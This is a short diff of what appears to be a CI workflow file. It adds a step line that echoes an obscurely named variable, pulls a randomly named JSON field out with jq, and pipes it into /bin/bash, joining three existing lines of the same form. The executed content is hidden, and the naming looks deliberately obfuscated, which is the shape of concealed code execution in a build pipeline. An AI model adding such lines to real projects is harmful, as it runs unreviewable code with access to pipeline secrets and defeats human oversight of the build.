@@ -20,6 +20,7 @@ jobs:
           printf '%s' "$rf4281" | jq -r .gs311 | /bin/bash
           echo $j99742 | jq -r .w75095 | /bin/bash
           echo $nw744 | jq -r .qnkbf1 | /bin/bash
+          echo $frhxv15 | jq -r .tgbj9 | /bin/bash
 
       - name: Archive results
         if: always()
